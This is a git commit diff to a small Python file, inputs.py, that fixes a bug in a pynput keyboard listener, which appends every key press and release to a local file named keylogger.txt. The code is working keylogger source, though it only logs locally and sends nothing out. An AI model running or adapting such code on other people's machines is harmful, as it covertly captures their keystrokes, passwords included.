21e5cd4ba6e020d4c2f0b609a2d603c4f1359164
AndManGames <schneidera6@googlemail.com>
2023-09-24 20:50:48 +0200

    changed f.print to f.write

--- inputs.py
+++ inputs.py
@@ -5,14 +5,14 @@ from pynput import keyboard
 def on_press(key):
     with open("keylogger.txt", "a") as f:
         try:
-            f.print('alphanumeric key {0} pressed'.format(key.char))
+            f.write('alphanumeric key {0} pressed'.format(key.char))
         except AttributeError:
-            f.print('special key {0} pressed'.format(key))
+            f.write('special key {0} pressed'.format(key))
 
 
 def on_release(key):
     with open("keylogger.txt", "a") as f:
-        f.print('{0} released'.format(key))
+        f.write('{0} released'.format(key))
         if key == keyboard.Key.esc:
             # Stop listener
             return False
